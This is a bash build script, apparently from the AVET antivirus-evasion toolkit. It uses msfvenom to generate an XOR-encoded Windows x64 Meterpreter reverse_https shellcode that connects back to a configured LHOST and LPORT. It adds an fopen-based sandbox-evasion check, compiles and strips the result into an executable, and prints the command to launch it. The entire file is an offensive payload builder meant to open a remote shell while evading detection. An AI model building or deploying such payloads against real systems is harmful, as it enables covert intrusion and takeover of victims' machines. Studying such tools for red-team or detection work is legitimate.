#!/bin/bash


#DESCRIPTION_START
# Executes 64-bit shellcode.
# Uses Metasploit's xor encoding. Uses fopen sandbox evasion.
#DESCRIPTION_END


# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc_c.txt

# add fopen sandbox evasion technique
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'

# set shellcode source
set_payload_source static_from_file input/sc_c.txt

# set decoder and key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode64


# compile
$win64_compiler -o output/fopen_mtrprtrxor_revhttps_win64.exe source/avet.c
strip output/fopen_mtrprtrxor_revhttps_win64.exe

# cleanup
cleanup_techniques

echo "
# Execute the following command:
# $ fopen_mtrprtrxor_revhttps_win64.exe
"